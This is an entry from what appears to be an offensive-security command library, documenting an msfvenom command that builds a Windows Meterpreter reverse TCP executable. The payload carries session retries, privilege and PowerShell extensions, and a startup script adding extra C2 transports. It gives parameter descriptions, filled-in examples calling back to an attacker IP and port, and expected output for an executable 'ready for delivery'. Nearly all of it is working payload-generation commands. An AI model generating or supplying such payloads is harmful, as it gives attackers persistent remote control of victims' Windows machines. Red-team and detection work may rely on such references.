---
id: 9e9c57f5-3ed3-469f-96b1-79258d30abe5
name: msfvenom-generate-windows-meterpreter-reverse-tcp-multi-transport
type: command
executor: bash
data: >-
  msfvenom -p windows/meterpreter_reverse_tcp LHOST=$_LHOST LPORT=$_LPORT
  sessionretrytotal=30 sessionretrywait=10 extensions=stdapi,priv,powershell
  extinit=powershell,$_SCRIPT_PATH -f exe -o $_OUTPUT_FILE
output: null
created_at: '2023-04-06T03:56:21.692310+00:00'
updated_at: '2023-04-10T20:24:56.696544+00:00'
platforms:
  - Windows
tags:
  - metasploit
  - payload-generation
verified: true
validated: true
---

# msfvenom-generate-windows-meterpreter-reverse-tcp-multi-transport

## Command

```bash
msfvenom -p windows/meterpreter_reverse_tcp LHOST=$_LHOST LPORT=$_LPORT sessionretrytotal=30 sessionretrywait=10 extensions=stdapi,priv,powershell extinit=powershell,$_SCRIPT_PATH -f exe -o $_OUTPUT_FILE
```

## Description

This command uses msfvenom to generate a Windows Meterpreter reverse TCP payload executable with built-in retry logic and PowerShell extensions. It loads a custom script at initialization to add multiple transports, enhancing C2 reliability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_LHOST | Attacker's listening IP address | Yes |
| $_LPORT | TCP port for reverse connection | Yes |
| sessionretrytotal=30 | Total connection retry attempts | No (default 30) |
| sessionretrywait=10 | Seconds to wait between retries | No (default 10) |
| extensions=stdapi,priv,powershell | Modules to load (standard API, privileges, PowerShell) | No |
| extinit=powershell,$_SCRIPT_PATH | PowerShell command to run at startup (path to transport script) | Yes |
| -f exe | Output format as Windows executable | Yes |
| -o $_OUTPUT_FILE | Output filename for the payload | Yes |

## Examples

### Basic Usage

```bash
msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 sessionretrytotal=30 sessionretrywait=10 extensions=stdapi,priv,powershell extinit=powershell,/home/user/AddTransports.ps1 -f exe -o payload.exe
```

### Advanced Usage

Add custom retries:
```bash
msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 sessionretrytotal=60 sessionretrywait=5 extensions=stdapi,priv,powershell extinit=powershell,/home/user/AddTransports.ps1 -f exe -o payload.exe
```

## Expected Output

[*] msfvenom -p windows/meterpreter_reverse_tcp ... > payload.exe
No encoder or badchars specified, outputting raw payload
Payload size: 37349 bytes
Final size of exe file: 37349 bytes
[*] Wrote payload to: payload.exe

The command creates an executable file ready for delivery.

## Related

- [[procedures/Metasploit-Multiple-Transports-Payload-Generator]]
- [[tools/Metasploit-Framework]]
